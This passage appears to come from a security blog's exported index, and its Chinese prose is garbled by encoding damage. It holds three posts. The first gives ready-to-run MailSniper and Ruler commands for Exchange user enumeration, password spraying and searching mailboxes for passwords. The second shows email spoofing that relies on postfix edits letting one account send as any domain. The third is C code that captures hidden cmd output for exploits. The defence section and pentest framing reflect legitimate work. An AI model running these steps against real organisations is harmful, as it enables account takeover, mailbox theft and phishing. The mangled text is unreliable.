´ï¼Œè¿˜å¯ä»¥ä½¿ç”¨theharvesterã€Mailgetç­‰å·¥å…·è¿›è¡Œæœé›†ï¼Œå¦å¤–è¿˜æœ‰ä¸€ç§é€šè¿‡å»¶æ—¶æ¥åˆ¤æ–­çš„æ–¹å¼ã€‚åœ¨MailSniper å†™äº†è¿™æ ·å‡ ç§æ¥åˆ¤æ–­å†…éƒ¨åŸŸå’Œå­˜åœ¨ç”¨æˆ·çš„æ–¹æ³•ï¼š Invoke-DomainHarvest Invoke-UsernameHarvestOWA Invoke-UsernameHarvestEAS é¦–å…ˆæ¥çœ‹Invoke-DomainHarvestï¼Œè¿™é‡Œé€šè¿‡äº†å‡ ç§æ–¹å¼æ¥è·å–å†…éƒ¨åŸŸåï¼Œæ„é€ å‚æ•°å¦‚ä¸‹ï¼š1Invoke-DomainHarvestOWA -ExchHostname domian.com è„šæœ¬ä¼šæ„é€ å¦‚ä¸‹url:1234$OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")$OWAURL2 = ("https://" + $ExchHostname + "/owa/")$autodiscoverurl = ("https://" + $ExchHostname + "/autodiscover/autodiscover.xml")$ewsurl = ("https://" + $ExchHostname + "/EWS/Exchange.asmx") åœ¨æœªæŒ‡å®šbruteçš„æƒ…å†µä¸‹ï¼Œè„šæœ¬ä¼šå…ˆè¯·æ±‚autodiscoverurl,è‹¥å¤±è´¥ï¼Œå†è¯·æ±‚ewsurlï¼Œå¹¶é€šè¿‡è¯·æ±‚å¤´é‡Œé¢çš„NTLM Authenticateæ•°æ®æ¥çŒœæµ‹å†…éƒ¨åŸŸåï¼Œå¦‚ï¼š éœ€è¦æ³¨æ„åˆ°æ˜¯ï¼ŒæœªæŒ‡å®šbruteçš„æ—¶å€™éœ€è¦æ›´æ”¹-ExchHostname ä¸ºå¯¹åº”çš„autodiscoverurlåŠewsurl æŒ‡å®šbruteçš„æƒ…å†µä¸‹ï¼Œåˆ™ä¼šä½¿ç”¨é€šè¿‡æ—¶é—´å»¶è¿Ÿçš„æ–¹å¼æ¥æ£€æµ‹åŸŸåæ˜¯å¦å­˜åœ¨ï¼Œé¦–å…ˆä¼šæ„é€ ä¸€äº›ä¸å­˜åœ¨çš„åŸŸåŠç”¨æˆ·åè¯·æ±‚owaï¼Œå¹¶è®°å½•å…¶å“åº”æ—¶é—´ï¼Œä¹‹åä½¿ç”¨æ„é€ çš„åŸŸå­—å…¸åŠéšæœºç”¨æˆ·åæ¥è¯·æ±‚owaï¼Œæ ¹æ®å…¶å“åº”æ—¶é—´çš„ä¸åŒæ¥åˆ¤æ–­åŸŸåŠç”¨æˆ·åï¼Œåœ¨è¿™é‡Œæœ‰ä¸¤ç§bruteæ–¹å¼ï¼Œç¬¬ä¸€ç§é€šè¿‡å¯¼å…¥åŸŸååˆ—è¡¨ï¼š1Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -brute ç¬¬äºŒç§é€šè¿‡å…¬å¸åç§°æ¥çŒœæµ‹ï¼š1Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -CompanyName "bla bla" -OutFile potentially-valid-domains.txt -brute è·å–åŸŸåä¹‹åï¼Œå¯å¯¼å…¥ç”¨æˆ·åè¿›è¡Œç”¨æˆ·åå­˜åœ¨æ£€æµ‹ï¼š12Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txtInvoke-UsernameHarvestEAS -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads 1 -OutFile eas-valid-users.txt PS : ä½œè€…è¯´è¿™ä¸ªé—®é¢˜æäº¤ç»™å¾®è½¯ä»¥åå¹¶æ²¡æœ‰ä¿®å¤ï¼Œä½†æ˜¯å®é™…æµ‹è¯•æ•ˆæœå¹¶ä¸å¥½ï¼Œä½†æ˜¯æ²¡å‡†ç¢°åˆ°å¯ä»¥ä½¿ç”¨çš„æƒ…å†µä¹Ÿè¯´ä¸å®šã€‚ å½“è·å–åˆ°ä¸€ä¸ªç”¨æˆ·çš„è´¦å·å¯†ç ä¹‹åï¼Œå¯ä»¥é€šè¿‡Get-GlobalAddressListæ¥è·å–GlobalAddressçš„ç”¨æˆ·é‚®ç®±åœ°å€ï¼š1Get-GlobalAddressList -ExchHostname owaurl -UserName username -Password password 0x03 Brute Forceåœ¨è¿™é‡Œæš´åŠ›ç ´è§£çš„åœ°æ–¹æœ‰å¾ˆå¤šä¸ªï¼Œé¦–å…ˆå¯ä»¥é€šè¿‡burpsuiteå¯¹OWAè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå¦å¤–å°±æ˜¯/autodiscoverã€/ewsã€/Microsoft-Server-ActiveSync ç­‰å‡ ä¸ªendpointï¼Œå¯åˆ©ç”¨çš„å·¥å…·å¦‚ï¼šMailSniperã€Rulerã€SprayingToolkitï¼Œå¯æ ¹æ®ä¸ªäººå–œå¥½å–èˆã€‚ä¸ºäº†é˜²æ­¢è´¦å·å› å¤šæ¬¡ç™»é™†å¤±è´¥è§¦å‘å‘Šè­¦æˆ–è´¦æˆ·è¢«å°ç¦ï¼Œå»ºè®®ä½¿ç”¨åŒå¯†ç çˆ†ç ´ç”¨æˆ·åçš„æ–¹å¼è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ä¸‹é¢ä»‹ç»ä¸€ä¸‹MailSniperçš„ç›¸å…³æ–¹æ³•çš„ä½¿ç”¨ã€‚ é€šè¿‡owaçˆ†ç ´ï¼š 12Import-Module .\MailSniper.ps1Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose é€šè¿‡ewsçˆ†ç ´ï¼š 1Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose é€šè¿‡Microsoft-Server-ActiveSyncçˆ†ç ´ï¼š 1Invoke-PasswordSprayEAS -ExchHostname MSAHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose é€šè¿‡autodiscover çˆ†ç ´ï¼šåœ¨MailSniperä¸­æ²¡æœ‰å†™å¯¹autodiscoverçš„çˆ†ç ´ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨burpã€ruleræˆ–è€…SprayingToolkitã€‚ 1python atomizer.py owa autodiscoverhost password user.txt 1./ruler --domain autodiscoverhost -k brute --users user.txt --passwords pass.txt --delay 0 --threads 10 -v 0x04 Search mailåœ¨è·å–åˆ°æŸç”¨æˆ·é‚®ç®±è´¦å·å¯†ç ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å…¶é‚®ä»¶å†…å®¹è¿›è¡Œæœç´¢ï¼Œé™¤äº†ç›´æ¥ç™»å½•é‚®ä»¶å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨Exchangeçš„æ¥å£è¿›è¡Œé‚®ä»¶çš„æ£€ç´¢ï¼Œå…¶æ¥å£çš„ç›¸å…³å¼€å‘å¯ä»¥å‚è€ƒã€ŠExchange Web Service(EWS)å¼€å‘æŒ‡å—%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/)ã€‹ï¼Œåœ¨å¤–ç½‘æƒ…å†µä¸‹ï¼Œå¯ä½¿ç”¨æ­¤å·¥å…·æ¥åˆ—å‡ºé‚®ä»¶å†…å®¹ã€‚1./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewshost/ews/Exchange.asmx -Mode ListMail -Folder Inbox æœç´¢æŸå­—ç¬¦ä¸²ï¼š1./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewhost/ews/Exchange.asmx -Mode SearchMail -String vpn æˆ–è€…ä½¿ç”¨MailSniperçš„Invoke-SelfSearchæ·»åŠ -remote å‚æ•°ï¼Œè¾“å…¥è´¦å·å¯†ç å³å¯ã€‚ä½¿ç”¨æ¥å£å¯ä»¥bypassä¸€äº›owaçš„2FAã€‚ å†…ç½‘æƒ…å†µä¸‹å¯ä½¿ç”¨MailSniperæ¥å¿«é€Ÿæ£€ç´¢ï¼Œå¦‚ä½¿ç”¨xiaoming\domainç”¨æˆ·ç™»å½•æŸä¸»æœºï¼Œå¯åœ¨è¯¥ä¸»æœºä¸Šæœç´¢xiaomingçš„é‚®ç®±ï¼ˆä¸éœ€è¦å¯†ç ï¼‰1Invoke-SelfSearch -Mailbox user@domain.com -Terms *pass* -Folder all -ExchangeVersion Exchange2013_SP1 -OutputCsv 1.csv å¦‚æœè·å¾—äº†åŸŸç®¡ç†å‘˜çš„å¯†ç ï¼Œå¯ä»¥æ£€ç´¢ä»»æ„é‚®ä»¶çš„å†…å®¹ï¼š 1Invoke-GlobalMailSearch -ImpersonationAccount beiguoxia -ExchHostname Exchangehostname -AdminUserName domain\administrator -AdminPassword password -Term "*pass*" -Folder all æ£€ç´¢å¯ä½¿ç”¨-Termæˆ–è€…æ­£åˆ™-Regexæ¥æŒ‡å®šå…³é”®å­—ï¼Œ-ImpersonationAccountç”¨äºå°†å½“å‰ç”¨æˆ·èº«ä»½åˆæ³•ä¼ªè£…å…¶ä»–é‚®ç®±ç”¨æˆ·ï¼Œè¿›è€Œè·å¾—æŸ¥è¯¢æ‰€æœ‰é‚®ç®±ç”¨æˆ·é‚®ä»¶çš„æƒé™ï¼Œå¦‚æœæŸ¥è¯¢å¤±è´¥ï¼Œå¯ä»¥å°è¯•æ·»åŠ -ExchangeVersionæ›´æ¢Exchangeç‰ˆæœ¬,ç›®å‰æ”¯æŒç‰ˆæœ¬ä¸ºExchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013,Exchange2013_SP1 0x05 åæ¸—é€åœ¨è·å–ä¸€ä¸ªç”¨æˆ·çš„è´¦å·å¯†ç ä¹‹åï¼Œå¦‚ä½•è¿›å…¥å†…ç½‘ï¼Ÿè¿™é‡Œæœ‰ä¸€ä¸ªç¥å™¨Ruler,åœ¨Outlookä¸­æœ‰ä¸€ä¸ªRules and Alertsçš„åŠŸèƒ½ï¼Œåˆ©ç”¨æ­¤åŠŸèƒ½ï¼Œå¯æ‰§è¡Œä¸€äº›ç‰¹å®šçš„å¦‚æ‰§è¡Œå‘½ä»¤ç­‰æ“ä½œï¼Œå…³äºrulerçš„å…·ä½“ä½¿ç”¨ï¼Œå¯ä»¥å‚è€ƒç›¸å…³æ–‡ç« ï¼Œå¦å¤–åœ¨å†…ç½‘ä¸­ï¼Œå¦‚ä½•å»å‘ç°ExchangeæœåŠ¡å™¨ï¼Œå¦‚ä½•ä½¿ç”¨NTLMä¸­ç»§æ¥æ¥ç®¡æŸç”¨æˆ·é‚®ç®±çš„æƒé™ï¼Œè¿™äº›å†…å®¹åœ¨ã€Šæ·±å…¥Exchange Serveråœ¨ç½‘ç»œæ¸—é€ä¸‹çš„åˆ©ç”¨æ–¹æ³•ã€‹ä¸­æœ‰äº†å¾ˆè¯¦ç»†çš„è®²è§£ï¼Œåœ¨è¿™é‡Œå°±ä¸å¤šåšé˜è¿°ã€‚ å¦å¤–éœ€è¦è¡¥å……ä¸€ç‚¹å¯èƒ½æœ‰ç”¨çš„ä¸œè¥¿ï¼ŒExchangeå®‰è£…ä»¥åä¼šåˆ›å»ºä¸€ä¸ªOrganization Management å®‰å…¨ç»„ï¼š è¯¥ç»„å†…çš„æˆå‘˜é™¤äº†è®¿é—®Exchagneè®¾ç½®å¤–ï¼Œå¯ä»¥ä¿®æ”¹å…¶ä»–Exchagneå®‰å…¨ç»„çš„æˆå‘˜èº«ä»½ï¼Œå¦‚Exchange Trusted Subsystem,æ­¤ç»„ä¸ºExchange Windows Permissionsçš„æˆå‘˜ é»˜è®¤æƒ…å†µä¸‹ï¼ŒExchange Windows Permissionså®‰å…¨ç»„å¯¹å®‰è£…Exchangeçš„åŸŸçš„åŸŸå¯¹è±¡å…·æœ‰writeDACLæƒé™,è¿™å°±æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œæƒé™çš„æå‡ï¼Œè¯¦ç»†çš„æ–‡ç« å¯ä»¥å‚è€ƒã€ŠEscalating privileges with ACLs in Active Directoryã€‹ã€‚ 0x06 æ€»ç»“æœ¬æ–‡è®°å½•äº†æˆ‘è‡ªå·±å¯¹Exchangeåœ¨æ¸—é€ä¸­çš„åˆ©ç”¨çš„ä¸€äº›æ–¹å¼çš„æ€»ç»“ï¼Œæ¬¢è¿è¡¥å……ï¼Œæ›´è¯¦ç»†çš„å†…å®¹å¯ä»¥æŸ¥çœ‹å‚è€ƒçš„æ–‡ç« ã€‚ 0x07 å‚è€ƒ https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0 https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/ https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/ https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>Exchange</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Something about email spoofing]]></title>
    <url>%2Farchives%2FEmail_spoofing.html</url>
    <content type="text"><![CDATA[0x00 è¿™æ˜¯ä¸ªå•¥ï¼Ÿä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬æ”¶åˆ°ä¸€å°é‚®ä»¶ä¹‹åï¼Œéƒ½ä¼šé¦–å…ˆçœ‹å‘ä»¶äººï¼Œå¦‚æœæ˜¯æ¯”è¾ƒé‡è¦çš„é‚®ä»¶ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå»çœ‹å‘ä»¶äººåœ°å€ï¼Œä½†æ˜¯ï¼Œå¦‚æœå‘ä»¶äººæ˜¯ä¼ªé€ çš„ï¼Œä½ è¿˜èƒ½çŸ¥é“æ˜¯è°å†ç»™ä½ å‘é‚®ä»¶ä¹ˆï¼Ÿå½“æˆ‘ä»¬åœ¨è°·æ­Œæœç´¢å‘ä»¶äººä¼ªé€ çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šå¾ˆå¤šçš„ç½‘ç«™æä¾›äº†è¿™æ ·çš„åŠŸèƒ½ï¼š è¿™äº›ç½‘ç«™æ²¡æœ‰æµ‹è¯•ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½æˆåŠŸä¼ªé€ ã€‚ é‚£åˆ°åº•æ˜¯ä»€ä¹ˆå¯¼è‡´çš„å‘ä»¶äººä¼ªé€ å‘¢ï¼Ÿä¸‹é¢æˆ‘ä»¬æ¥åˆ†æåˆ†æé€ æˆå‘ä»¶äººä¼ªé€ çš„æˆå› ã€‚ 0x01 SMTPæ˜¯ä»€ä¹ˆï¼Ÿè¦æƒ³äº†è§£æˆå› ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯SMTPï¼Œé¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹å‡ ä¸ªæ¦‚å¿µï¼šMUA:Mail User Agentã€‚ç”¨æˆ·é‚®ä»¶ä»£ç†,ç”¨æˆ·é€šè¿‡MUAæ¥æ”¶å‘é€é‚®ä»¶.ä¾‹å¦‚Outlook, FoxMailç­‰ã€‚MTA: Mail Transfer Protocolã€‚é‚®ä»¶ä¼ è¾“ä»£ç†,æ˜¯SMTPçš„ä¸€ç§å®ç°ï¼ŒMTAä»…ä»…è´Ÿè´£é‚®ä»¶çš„ä¼ è¾“ã€‚å¦‚æœä¿¡ä»¶çš„ç›®çš„åœ°å¹¶ä¸æ˜¯æœ¬èº«çš„ç”¨æˆ·ï¼Œä¸”è¯¥å°ä¿¡çš„ç›¸å…³æ•°æ®ç¬¦åˆä½¿ç”¨ MTA çš„æƒåŠ›ï¼Œ é‚£ä¹ˆMTA å°±ä¼šå°†è¯¥å°ä¿¡å†ä¼ é€åˆ°ä¸‹ä¸€éƒ¨ä¸»æœºä¸Šã€‚è¿™å³æ˜¯æ‰€è°“çš„è½¬é€’çš„åŠŸèƒ½ã€‚MDA: Mail Deliver Agentï¼Œé‚®ä»¶åˆ†å‘ä»£ç†ã€‚è´Ÿè´£å°†æ¥æ”¶åˆ°çš„é‚®ä»¶ä¿å­˜åœ¨é‚®ä»¶æœåŠ¡å™¨ä¸Šï¼Œåœ¨è¿™é‡Œå¯ä»¥è®¾ç½®å¯¹é‚®ä»¶è¿›è¡Œè¿‡æ»¤æˆ–è‡ªåŠ¨å›å¤ã€‚MRA: Mail Receive Agentï¼Œé‚®ä»¶æ¥æ”¶ä»£ç†,ç”¨æ¥å®ç°IMAP,POP3åè®®,è´Ÿè´£ä¸MUAäº¤äº’,å°†æœåŠ¡å™¨ä¸Šçš„é‚®ä»¶é€šè¿‡IMAPä»¥åŠPOP3ä¼ è¾“ç»™å®¢æˆ·ç«¯ã€‚ SMTPå…¨ç§°æ˜¯Simple Mail Transfer Protocol,ç›´è¯‘è¿‡æ¥å°±æ˜¯ç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼Œä¸»è¦çš„å·¥ä½œå°±æ˜¯æŠŠé‚®ä»¶ä¿¡æ¯ä»å‘ä»¶äººçš„é‚®ä»¶æœåŠ¡å™¨ä¸­ä¼ é€åˆ°æ¥æ”¶äººçš„é‚®ä»¶æœåŠ¡å™¨ä¸­ï¼Œå¶å°”æˆ‘ä»¬ä½¿ç”¨MUAæ¥å‘é€é‚®ä»¶çš„è¯,ä¹Ÿæ‰¿è½½ä¼ è¾“ç”¨æˆ·é‚®ä»¶åˆ°å‘ä»¶æœåŠ¡å™¨çš„åŠŸèƒ½ï¼Œä½†æ˜¯SMTPå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ²¡æœ‰å¯¹å‘é€æ–¹è¿›è¡Œä¸€ä¸ªèº«ä»½éªŒè¯ã€‚ç”¨ä¸‹é¢çš„å›¾æ¥è¯´æ˜ä¸€ä¸‹é‚®ä»¶çš„æŠ•é€’è¿‡ç¨‹ã€‚ 1ã€ç”¨æˆ·åˆ©ç”¨MUAå¯„ä¿¡åˆ°MTAï¼Œè¿™é‡Œé¢åŒ…å«äº†å‡ ä¸ªé¡¹ï¼šå‘ä¿¡äººä¸å‘ä¿¡ç½‘ç«™ï¼šä¾‹å¦‚ admin@evi1cg.meï¼Œå…¶ä¸­evi1cg.meå°±æ˜¯å‘ä¿¡ç½‘ç«™ï¼Œå³æ”¶ä¿¡ä»¶çš„MTAã€‚æ”¶ä¿¡äººä¸æ”¶ä¿¡ç½‘ç«™ï¼šä¾‹å¦‚ admin@email.serverï¼Œå…¶ä¸­adminå°±æ˜¯email.serveré‡Œçš„ä¸€ä¸ªè´¦å·ã€‚2ã€å½“MTAæ”¶åˆ°ä¿¡ä»¶åï¼Œä¼šé€šè¿‡DNSçš„MXè®°å½•è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœemail.serveræ˜¯MTAè‡ªå·±ï¼Œæ­¤æ—¶MTAå°±ä¼šæŠŠé‚®ä»¶äº¤ç»™MDAå¤„ç†ï¼Œæ”¾ç½®åˆ°æ”¶ä¿¡è€…çš„ä¿¡ç®±ä¸­ã€‚3ã€å¦‚æœemail.serverä¸æ˜¯è‡ªå·±ï¼Œé‚£ä¹ˆè¿™ä¸ªä¿¡ä»¶å°±ä¼šè¢«è½¬é€å‡ºå»ã€‚4ã€å½“è¿œç¨‹MTAæ”¶åˆ°æœ¬åœ°MTAè½¬å‘çš„é‚®ä»¶åï¼Œä¼šå°†ä¿¡ä»¶äº¤ç»™å®ƒçš„MDAå¤„ç†ï¼Œç­‰å¾…ç”¨æˆ·çš„è¯»å–æˆ–ä¸‹è½½ã€‚ æ­£æ˜¯ç”±äºMTAä¹‹é—´è½¬å‘é‚®ä»¶æ˜¯ä¸éœ€è¦è®¤è¯çš„ï¼Œæ‰€ä»¥è¿™å°±æˆäº†å¯ä»¥ä¼ªé€ å‘ä»¶äººçš„åŸå› ã€‚ 0x02 æ€ä¹ˆæ­å»ºSMTP Serverï¼Ÿå¦‚ä½•å¿«é€Ÿæ­å»ºè‡ªå·±çš„SMTP Serverï¼Ÿè¿™ä¸ªç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œè¿™é‡Œä¸ºäº†å¿«é€Ÿæ­å»ºï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨ewomailï¼Œä»£ç æ˜¯å¼€æºçš„,æ­å»ºèµ·æ¥ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œä¹Ÿæœ‰å¾ˆå¥½åœ°è¯´æ˜æ–‡æ¡£ï¼ŒEwoMailæ˜¯åŸºäºpostfixå’ŒDovecotï¼ŒæŒ‰ç…§è¯´æ˜æ–‡æ¡£å¾ˆå¿«å°±å¯ä»¥éƒ¨ç½²å®Œæ¯•äº†ï¼Œéƒ¨ç½²å®Œæ¯•ä»¥åéœ€è¦æ·»åŠ ç”¨æˆ·è´¦å·ï¼šä¹‹åå°±å¯ä»¥é€šè¿‡æ·»åŠ çš„è´¦å·æ¥å‘é€é‚®ä»¶äº†ã€‚ 0x03 å¦‚ä½•ä¼ªé€ åŸŸåï¼Ÿå…³äºä¼ªé€ åŸŸåæœ‰ä¸€ä¸ªå¾ˆå¥½ç”¨çš„å·¥å…·SimpleEmailSpooferï¼Œä¸‹é¢æˆ‘ä»¬å°±ä½¿ç”¨è¿™ä¸ªå·¥å…·æ¥æµ‹è¯•ä¸€ä¸‹ï¼š1python SimpleEmailSpoofer.py -t ç›®æ ‡é‚®ç®± -f è¦ä¼ªé€ çš„å‘ä»¶äººåœ°å€ -n From_name -e é‚®ä»¶å†…å®¹ -j é‚®ä»¶ä¸»é¢˜ -s ä½ è‡ªå·±çš„smtpåœ°å€ -p 25 --user ä½ æ·»åŠ çš„ç”¨æˆ· --pass ä½ æ·»åŠ ç”¨æˆ·çš„å¯†ç  åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°æŠ¥é”™äº†ï¼ŒSender address rejected: not owned by user xxx, è¿™é‡Œæ˜¯postfixè®¾ç½®çš„é—®é¢˜ã€‚éœ€è¦è¿›è¡Œä¸€ä¸‹ä¿®æ”¹/etc/postfix/main.cfæ‰¾åˆ°smtpd_sender_login_mapsï¼Œä¿®æ”¹ä¸ºï¼š1smtpd_sender_login_maps = mysql:/etc/postfix/mysql/mysql-sender-login-maps.cf,pcre:/etc/postfix/login_maps.pcre æ–°å»º/etc/postfix/login_maps.pcre1/^(.*)$/ test@yourdomain.com æ„æ€æ˜¯å…è®¸ç”¨æˆ·test@yourdomain.comçš„ç”¨æˆ·ä½¿ç”¨ä»»æ„domain æ‰¾åˆ°smtpd_recipient_restrictionsï¼Œåˆ é™¤reject_unknown_sender_domainï¼Œè¿™æ ·å°±ä¸ä¼šå¯¹å‘é€çš„åŸŸè¿›è¡ŒéªŒè¯äº†ã€‚ ä¿®æ”¹å®Œæˆä»¥åï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š12postmap /etc/postfix/login_maps.pcrepostfix reload ä¿®æ”¹å®Œæˆä»¥åï¼Œå†æ¬¡å‘é€ï¼š æŸ¥çœ‹gmail: å½“ç„¶ï¼Œåœ¨åŸå§‹é‚®ä»¶é‡Œé¢ï¼Œè¿˜æ˜¯æœ‰è‡ªå·±çš„åŸŸåä¿¡æ¯ã€‚å¦‚ä½•å°½é‡å‡å°‘è‡ªå·±çš„ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ã€‚ ç»è¿‡æµ‹è¯•ï¼Œå¦‚æœæ”¶ä¿¡æœåŠ¡å™¨å¯¹SPFæ ¡éªŒä¸é€šè¿‡çš„é‚®ä»¶æœªä½œå¤„ç†ï¼Œä»ç„¶å¯ä»¥ä¼ªé€ æ·»åŠ è¿‡SPFè®°å½•çš„åŸŸã€‚å¦‚QQé‚®ç®±æ£€æŸ¥SPFå¤±è´¥å°±ç›´æ¥æ‹’ç»æ¥æ”¶é‚®ä»¶ï¼Œä½†æ˜¯gmailä»ç„¶æ¥æ”¶ã€‚è¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹ï¼ŒSPFä¸­å¦‚æœé…ç½®ä¸º~allï¼Œåˆ™è¡¨ç¤ºä¸ºæ¥å—æ¥ä¿¡ï¼Œä½†æ˜¯åšæ ‡è®°ï¼ŒQQé‚®ç®±é‡Œå°±ä¼šæ¥æ”¶åˆ°æ­¤ç±»ä¼ªé€ çš„é‚®ä»¶ï¼Œä½†æ˜¯å›æ”¾ç½®äºåƒåœ¾é‚®ä»¶é‡Œã€‚ 0x04 å¦‚ä½•æ£€æµ‹ï¼Ÿè¿™é‡Œæœ‰ä¸€ä¸ªå·¥å…·å¯ä»¥ç”¨æ¥æ£€æµ‹åŸŸåæ˜¯å¦å¯ä»¥è¢«ä¼ªé€ :spoofcheckï¼Œä½¿ç”¨å¾ˆç®€å•ï¼Œæ¯”å¦‚baidu: 0x05 å¦‚ä½•è§£å†³ï¼Ÿä¸ºäº†ä½¿å¾—åŸŸåä¸ä¼šè¢«ä¼ªé€ ï¼Œéœ€è¦ä¸ºåŸŸåæ­£ç¡®é…ç½®SPFã€DKIMã€DMARCã€‚åªé…ç½®SPFæ˜¯ä¸è¡Œçš„ï¼Œå…³äºSPFçš„é…ç½®å¯ä»¥å‚è€ƒè¿™é‡Œï¼Œå…³äºDKIMçš„é…ç½®ï¼Œå¯ä»¥çœ‹è¿™é‡Œï¼Œå…³äºDMARCçš„é…ç½®å¯ä»¥å‚è€ƒè¿™é‡Œã€‚ 0x06 å‚è€ƒ https://www.jianshu.com/p/610d9bf0ae8b http://lomu.me/post/SPF-DKIM-DMARC-PTR https://serverfault.com/questions/318334/how-to-enforce-sender-address-to-be-logged-in-userexample-org-in-postfix https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/ https://realtechtalk.com/Postfix_how_to_secure_outgoing_authenticated_emails_for_privacy_and_hide_the_IP_address_mailer_and_other_things-1573-articles]]></content>
      <categories>
        <category>è¿ç»´</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[åŒ¿åç®¡é“è¯»å–CMDå›æ˜¾ä¿¡æ¯]]></title>
    <url>%2Farchives%2FGet_cmd.html</url>
    <content type="text"><![CDATA[æœ€è¿‘æ”¹expçš„æ—¶å€™ç”¨åˆ°çš„ï¼ŒåŠ åˆ°expé‡Œé¢å›æ˜¾æ‰§è¡Œä¿¡æ¯ï¼Œä¿å­˜ä¸€ä»½~12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#define EXE_NAME NULL//TEXT("Cmd.exe")#define EXE_CMD TEXT("Cmd.exe /C ipconfig/all")int main()&#123; char Buffer[4096]; STARTUPINFO sInfo;//æ–°è¿›ç¨‹çš„ä¸»çª—å£ç‰¹æ€§ PROCESS_INFORMATION pInfo; SECURITY_ATTRIBUTES sa; HANDLE hRead, hWrite; DWORD bytesRead; //è¯»å–ä»£ç çš„é•¿åº¦ sa.nLength = sizeof(SECURITY_ATTRIBUTES); //ç»“æ„ä½“çš„å¤§å°ï¼Œå¯ç”¨SIZEOFå–å¾— sa.lpSecurityDescriptor = NULL;//å®‰å…¨æè¿°ç¬¦ sa.bInheritHandle = TRUE; //å®‰å…¨æè¿°çš„å¯¹è±¡èƒ½å¦è¢«æ–°åˆ›å»ºçš„è¿›ç¨‹ç»§æ‰¿ if (!CreatePipe(&amp;hRead, &amp;hWrite, &amp;sa, 0)) //åˆ›å»ºåŒ¿åç®¡é“ &#123; return GetLastError(); //è¿”å›æœ€è¿‘çš„ä¸€ä¸ªé”™è¯¯ï¼Œ0è¡¨ç¤ºæ­£å¸¸ &#125; GetStartupInfo(&amp;sInfo); sInfo.cb = sizeof(sInfo); sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; sInfo.wShowWindow = SW_HIDE; sInfo.hStdError = hWrite; //å°†ç®¡é“çš„å†™ç«¯äº¤ç»™å­è¿›ç¨‹ sInfo.hStdOutput = hWrite; memset(&amp;pInfo, 0, sizeof(pInfo)); if (!CreateProcess(EXE_NAME, EXE_CMD, NULL, NULL, TRUE, 0, NULL, NULL, &amp;sInfo, &amp;pInfo)) //åˆ›å»ºå­è¿›ç¨‹ &#123; CloseHandle(hWrite); CloseHandle(hRead); return GetLastError(); &#125; CloseHandle(hWrite); //å…³é—­çˆ¶è¿›ç¨‹çš„å†™ç«¯ for (int i = 0;; ++i) &#123; if (!ReadFile(hRead, Buffer, sizeof(Buffer) - 1, &amp;bytesRead, NULL)) //è¯»å–å†…å®¹ &#123; break; &#125; Buffer[bytesRead] = 0; printf("%s\n", Buffer); &#125; WaitForSingleObject(pInfo.hProcess, INFINITE);//å½“ç­‰å¾…ä»åœ¨æŒ‚èµ·çŠ¶æ€æ—¶ï¼Œå¥æŸ„è¢«å…³é—­ï¼Œé‚£ä¹ˆå‡½æ•°è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚è¯¥å¥æŸ„å¿…é¡»å…·æœ‰ SYNCHRONIZE è®¿é—®æƒé™; CloseHandle(hRead); system("pause"); return 0;&#125; from: http://www.cnblogs.com/onlyac/p/5346478.html]]></content>
      <categories>
        <category>éšä¾¿å†™å†™</category>
      </categories>
  </entry>
  <entry>
